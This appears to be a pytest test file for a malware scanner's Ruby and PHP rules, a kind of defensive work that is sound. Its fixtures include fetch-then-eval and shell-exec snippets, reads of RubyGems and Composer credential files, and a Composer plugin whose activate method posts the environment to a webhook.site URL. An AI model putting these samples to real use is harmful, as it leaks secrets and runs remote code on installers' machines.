"""Ruby and PHP behaviour: the shapes the language-agnostic and one-construct rules could not see.

A two-statement fetch-then-evaluate, a credential store reached through a path built from quoted
components, and a Composer plugin, whose class Composer runs during install. Each is checked both
ways: the attack is recorded, and the ordinary code nearest to it is not.
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.composer_plugins import ComposerPluginHooks
from cordon_scanner.core.config import Config
from cordon_scanner.core.content import FileContent
from cordon_scanner.core.models import Capability
from cordon_scanner.detect.capability import ScriptFetchedThenEvaluated
from cordon_scanner.rules.loader import RuleLoader


class RubyPhpHelpers:
    @staticmethod
    def fetched_then_evaluated(path: str, language: str, text: str) -> list:
        return ScriptFetchedThenEvaluated.hits(
            FileContent.from_bytes(path, text.encode()), language
        )

    @staticmethod
    def findings(tmp_path: Path, files: dict[str, str]) -> set[str]:
        for rel, text in files.items():
            target = tmp_path / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text)
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {f.rule_id for f in result.findings if not f.rule_id.startswith("OPERATIONAL")}


class TestRubyFetchedThenEvaluated:
    @pytest.mark.parametrize(
        "source",
        [
            'body = URI.open("https://example.test/p.rb").read',
            'body = URI.parse("https://example.test/p.rb").read',
            'body = Net::HTTP.get(URI("https://example.test/p.rb"))',
            'body = Net::HTTP.get_response(URI("https://example.test/p.rb")).body',
            'body = open("https://example.test/p.rb").read',
            'body = HTTParty.get("https://example.test/p.rb").body',
            'body = Faraday.get("https://example.test/p.rb").body',
            'body = RestClient.get("https://example.test/p.rb").body',
        ],
    )
    def test_every_network_read_bound_then_evaluated_is_recorded(self, source) -> None:
        hits = RubyPhpHelpers.fetched_then_evaluated(
            "lib/x.rb", "ruby", f"{source}\nputs 1\neval(body)\n"
        )
        assert len(hits) == 1
        assert hits[0].capability is Capability.FETCH_EXEC and hits[0].line == 3

    @pytest.mark.parametrize(
        "sink", ["eval body", "Kernel.eval(body)", "instance_eval(body)", "class_eval body"]
    )
    def test_every_evaluator_is_a_sink(self, sink) -> None:
        text = f'body = URI.open("https://example.test/p").read\n{sink}\n'
        assert RubyPhpHelpers.fetched_then_evaluated("lib/x.rb", "ruby", text)

    def test_evaluating_a_different_variable_is_not_recorded(self) -> None:
        text = 'data = Net::HTTP.get(URI("https://example.test/v"))\ntemplate = File.read("t.erb")\neval(template)\n'
        assert RubyPhpHelpers.fetched_then_evaluated("lib/x.rb", "ruby", text) == []

    def test_a_longer_name_sharing_the_prefix_is_not_the_variable(self) -> None:
        text = 'body = URI.open("https://example.test/p").read\neval(body_template)\n'
        assert RubyPhpHelpers.fetched_then_evaluated("lib/x.rb", "ruby", text) == []

    def test_an_evaluation_before_the_read_is_not_recorded(self) -> None:
        text = 'eval(body)\nbody = URI.open("https://example.test/p").read\n'
        assert RubyPhpHelpers.fetched_then_evaluated("lib/x.rb", "ruby", text) == []

    def test_an_evaluation_beyond_the_window_is_not_bound_to_the_read(self) -> None:
        filler = "x = 1\n" * (ScriptFetchedThenEvaluated.WINDOW // 6 + 10)
        text = f'body = URI.open("https://example.test/p").read\n{filler}eval(body)\n'
        assert RubyPhpHelpers.fetched_then_evaluated("lib/x.rb", "ruby", text) == []

    def test_other_languages_are_not_read_by_this(self) -> None:
        text = 'body = URI.open("https://example.test/p").read\neval(body)\n'
        assert RubyPhpHelpers.fetched_then_evaluated("x.py", "python", text) == []
        assert RubyPhpHelpers.fetched_then_evaluated("x.rb", None, text) == []

    def test_the_byte_offset_is_measured_in_bytes(self) -> None:
        text = '# héllo\nbody = URI.open("https://example.test/p").read\neval(body)\n'
        (hit,) = RubyPhpHelpers.fetched_then_evaluated("lib/x.rb", "ruby", text)
        raw = text.encode()
        assert raw[hit.byte_start : hit.byte_end].decode().startswith("eval")


class TestPhpFetchedThenEvaluated:
    @pytest.mark.parametrize(
        "source",
        [
            "$code = file_get_contents('https://example.test/p');",
            '$code = file_get_contents("http://example.test/p");',
            "$code = @file_get_contents('https://example.test/p');",
            "$code = curl_exec($ch);",
        ],
    )
    @pytest.mark.parametrize(
        "sink",
        [
            "eval($code);",
            "assert($code);",
            "system($code);",
            "shell_exec($code);",
            "passthru($code);",
        ],
    )
    def test_a_network_read_handed_to_an_evaluator_or_shell(self, source, sink) -> None:
        hits = RubyPhpHelpers.fetched_then_evaluated("x.php", "php", f"<?php\n{source}\n{sink}\n")
        assert len(hits) == 1 and hits[0].rule_id == ScriptFetchedThenEvaluated.RULE_ID

    def test_a_local_file_read_is_not_a_network_read(self) -> None:
        text = "<?php\n$code = file_get_contents(__DIR__ . '/x.php');\neval($code);\n"
        assert RubyPhpHelpers.fetched_then_evaluated("x.php", "php", text) == []

    def test_decoding_a_response_is_the_ordinary_case(self) -> None:
        text = "<?php\n$body = curl_exec($ch);\n$data = json_decode($body, true);\n"
        assert RubyPhpHelpers.fetched_then_evaluated("x.php", "php", text) == []

    def test_a_variable_whose_name_extends_the_bound_one_is_not_it(self) -> None:
        text = "<?php\n$code = curl_exec($ch);\neval($code_template);\n"
        assert RubyPhpHelpers.fetched_then_evaluated("x.php", "php", text) == []


class TestComposerPluginHooks:
    @staticmethod
    def unit(path: str, text: str) -> SimpleNamespace:
        return SimpleNamespace(path=path, content=SimpleNamespace(text=text))

    @staticmethod
    def manifest(**fields) -> str:
        return json.dumps({"name": "acme/p", "type": "composer-plugin", **fields})

    def test_the_plugin_class_resolves_through_psr4(self) -> None:
        document = json.loads(
            self.manifest(
                autoload={"psr-4": {"Acme\\P\\": "src/"}}, extra={"class": "Acme\\P\\Plugin"}
            )
        )
        assert ComposerPluginHooks.candidates(document, "") == ["src/Plugin.php"]
        assert ComposerPluginHooks.candidates(document, "vendor/acme/p") == [
            "vendor/acme/p/src/Plugin.php"
        ]

    def test_a_list_of_classes_and_of_directories(self) -> None:
        document = json.loads(
            self.manifest(
                autoload={"psr-4": {"Acme\\P\\": ["src/", "lib"]}},
                extra={"class": ["Acme\\P\\One", "\\Acme\\P\\Sub\\Two"]},
            )
        )
        assert set(ComposerPluginHooks.candidates(document, "")) == {
            "src/One.php",
            "lib/One.php",
            "src/Sub/Two.php",
            "lib/Sub/Two.php",
        }

    @pytest.mark.parametrize(
        "fields",
        [
            {"extra": {"class": "Acme\\P\\Plugin"}},
            {"autoload": {"psr-4": {"Acme\\P\\": "src/"}}},
            {"autoload": {"psr-4": {"Other\\": "src/"}}, "extra": {"class": "Acme\\P\\Plugin"}},
            {"autoload": {"psr-4": {"Acme\\P\\": 7}}, "extra": {"class": "Acme\\P\\Plugin"}},
            {"autoload": "nope", "extra": {"class": 12}},
            {
                "autoload": {"psr-4": {"Acme\\P\\": "../../outside"}},
                "extra": {"class": "Acme\\P\\Plugin"},
            },
        ],
    )
    def test_nothing_resolves_from_an_incomplete_or_hostile_manifest(self, fields) -> None:
        assert ComposerPluginHooks.candidates(json.loads(self.manifest(**fields)), "") == []

    def test_only_scanned_files_become_hooks(self) -> None:
        manifest = self.manifest(
            autoload={"psr-4": {"Acme\\P\\": "src/"}}, extra={"class": "Acme\\P\\Plugin"}
        )
        units = [self.unit("composer.json", manifest), self.unit("src/Plugin.php", "<?php")]
        assert ComposerPluginHooks.paths(units) == {"src/Plugin.php"}
        assert ComposerPluginHooks.paths(units[:1]) == set()

    def test_an_ordinary_library_has_no_install_time_class(self) -> None:
        manifest = json.dumps(
            {
                "name": "acme/lib",
                "type": "library",
                "autoload": {"psr-4": {"Acme\\": "src/"}},
                "extra": {"class": "Acme\\X"},
            }
        )
        units = [self.unit("composer.json", manifest), self.unit("src/X.php", "<?php")]
        assert ComposerPluginHooks.paths(units) == set()

    def test_a_manifest_inside_an_archive_resolves_inside_it(self) -> None:
        manifest = self.manifest(
            autoload={"psr-4": {"Acme\\P\\": "src/"}}, extra={"class": "Acme\\P\\Plugin"}
        )
        units = [
            self.unit("dist.zip!pkg/composer.json", manifest),
            self.unit("dist.zip!pkg/src/Plugin.php", "<?php"),
        ]
        assert ComposerPluginHooks.paths(units) == {"dist.zip!pkg/src/Plugin.php"}

    @pytest.mark.parametrize("text", ["{not json", "[]", '"a string"', "{" * 5000])
    def test_an_unreadable_manifest_is_no_hook_and_no_crash(self, text) -> None:
        assert ComposerPluginHooks.paths([self.unit("composer.json", text)]) == set()

    def test_a_unit_without_text_is_skipped(self) -> None:
        assert (
            ComposerPluginHooks.paths([SimpleNamespace(path="composer.json", content=None)])
            == set()
        )

    def test_the_number_of_classes_read_is_bounded(self) -> None:
        classes = [f"Acme\\P\\C{i}" for i in range(100)]
        document = json.loads(
            self.manifest(autoload={"psr-4": {"Acme\\P\\": "src/"}}, extra={"class": classes})
        )
        assert len(ComposerPluginHooks.candidates(document, "")) == ComposerPluginHooks.MAX_CLASSES


class TestCredentialStores:
    @pytest.fixture
    def rule(self):
        for pack in RuleLoader.load_builtin():
            for compiled in pack.rules:
                if compiled.id == "CAP.CREDENTIAL.STORE.001":
                    return compiled
        raise AssertionError("CAP.CREDENTIAL.STORE.001 is not shipped")

    @pytest.mark.parametrize(
        "line",
        [
            'File.read(File.join(Dir.home, ".gem", "credentials"))',
            "File.read(File.expand_path('~/.gem/credentials'))",
            "file_get_contents(getenv('HOME') . '/.composer/auth.json')",
            "file_get_contents(getenv('COMPOSER_HOME') . '/auth.json')",
        ],
    )
    def test_rubygems_and_composer_stores_are_recognised(self, rule, line) -> None:
        assert rule.match.regex.search(line.encode()), line

    @pytest.mark.parametrize(
        "line", ['gem "credentials"', "auth = load_auth_json(path)", "# see .gem docs"]
    )
    def test_the_words_alone_are_not(self, rule, line) -> None:
        assert not rule.match.regex.search(line.encode()), line


class TestEndToEnd:
    def test_a_composer_plugin_posting_the_environment_to_a_webhook_is_malware(
        self, tmp_path
    ) -> None:
        found = RubyPhpHelpers.findings(
            tmp_path,
            {
                "composer.json": json.dumps(
                    {
                        "name": "acme/p",
                        "type": "composer-plugin",
                        "autoload": {"psr-4": {"Acme\\P\\": "src/"}},
                        "extra": {"class": "Acme\\P\\Plugin"},
                    }
                ),
                "src/Plugin.php": (
                    "<?php\nnamespace Acme\\P;\nclass Plugin {\n  public function activate($c, $io) {\n"
                    "    $ch = curl_init('https://webhook.site/00000000-0000-4000-8000-000000000000');\n"
                    "    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(getenv()));\n"
                    "    curl_exec($ch);\n  }\n}\n"
                ),
            },
        )
        assert "MALWARE.EXFIL.DROP_POINT.001" in found

    def test_the_same_class_outside_a_plugin_package_is_only_suspicious(self, tmp_path) -> None:
        found = RubyPhpHelpers.findings(
            tmp_path,
            {
                "composer.json": json.dumps({"name": "acme/p", "type": "library"}),
                "src/Plugin.php": (
                    "<?php\n$ch = curl_init('https://webhook.site/00000000-0000-4000-8000-000000000000');\n"
                    "curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(getenv()));\ncurl_exec($ch);\n"
                ),
            },
        )
        assert "SUSPECT.EXFIL.DROP_POINT.001" in found
        assert not any(rule.startswith("MALWARE.") for rule in found)

    def test_a_benign_plugin_is_silent(self, tmp_path) -> None:
        found = RubyPhpHelpers.findings(
            tmp_path,
            {
                "composer.json": json.dumps(
                    {
                        "name": "acme/p",
                        "type": "composer-plugin",
                        "autoload": {"psr-4": {"Acme\\P\\": "src/"}},
                        "extra": {"class": "Acme\\P\\Plugin"},
                    }
                ),
                "src/Plugin.php": "<?php\nnamespace Acme\\P;\nclass Plugin {\n  public function activate($c, $io) { $io->write('ready'); }\n}\n",
            },
        )
        assert found == set()

    def test_a_ruby_client_that_evaluates_a_template_is_silent(self, tmp_path) -> None:
        found = RubyPhpHelpers.findings(
            tmp_path,
            {
                "lib/x.rb": (
                    "require 'net/http'\nrequire 'json'\n"
                    "data = Net::HTTP.get(URI('https://api.example.test/v'))\nparsed = JSON.parse(data)\n"
                    "template = File.read('t.erb')\neval(template)\n"
                )
            },
        )
        assert "SUSPECT.DROPPER.001" not in found
